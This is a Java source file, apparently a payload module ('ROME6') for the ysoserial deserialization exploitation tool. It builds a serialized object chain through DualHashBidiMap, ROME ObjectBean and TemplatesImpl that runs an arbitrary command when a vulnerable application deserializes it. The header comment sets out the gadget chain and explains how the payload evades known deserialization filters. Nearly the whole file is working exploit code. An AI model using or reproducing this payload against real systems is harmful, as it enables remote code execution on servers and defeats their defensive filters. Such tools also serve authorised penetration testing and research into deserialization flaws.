package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;

import javax.xml.transform.Templates;

import org.apache.commons.collections.bidimap.DualHashBidiMap;

import com.sun.syndication.feed.impl.ObjectBean;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME via DualHashBidiMap entry — bypasses HashMap AND InvokerTransformer filters.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				DualHashBidiMap.put(key, value)
					HashMap.put(key, value)  // internal normalMap
						key.hashCode()
							ObjectBean.hashCode()
								EqualsBean.beanHashCode()
									ObjectBean.toString()
										ToStringBean.toString()
											BeanIntrospector iterates getters
												TemplatesImpl.getOutputProperties()
													TemplatesImpl.newTransformer()
														defineTransletClasses() -> RCE

	Filter evasion:
		1. DualHashBidiMap (o.a.c.c.bidimap) — not in any known filter
		2. No HashMap/HashSet/Hashtable/CHM in serialized stream
		3. No InvokerTransformer — ROME uses ToStringBean getter dispatch
		4. Combines two independently powerful bypasses:
		   - Novel entry class (vs HashMap in ROME1)
		   - No CC transformer classes in payload (vs CC chains)

	Discovered by combining IOCD entry point analysis with ROME chain mechanics.

	Requires:
		rome 1.0
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"rome:rome:1.0", "commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class ROME6 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		final ObjectBean delegate = new ObjectBean(Templates.class, tpl);
		final ObjectBean root = new ObjectBean(ObjectBean.class, delegate);

		// DualHashBidiMap with dummy entry — avoids triggering ObjectBean.hashCode()
		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put("dummy", "bar");

		// Access normalMap (maps[0] in AbstractDualBidiMap)
		// maps is a transient Map[] where maps[0]=normalMap, maps[1]=reverseMap
		java.util.Map[] maps = (java.util.Map[]) Reflections.getFieldValue(bidi, "maps");
		HashMap normalMap = (HashMap) maps[0];

		// Replace key in normalMap's internal table with armed ObjectBean
		Field tableField = HashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(normalMap);

		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], root);
				break;
			}
		}

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROME6.class, args);
	}
}
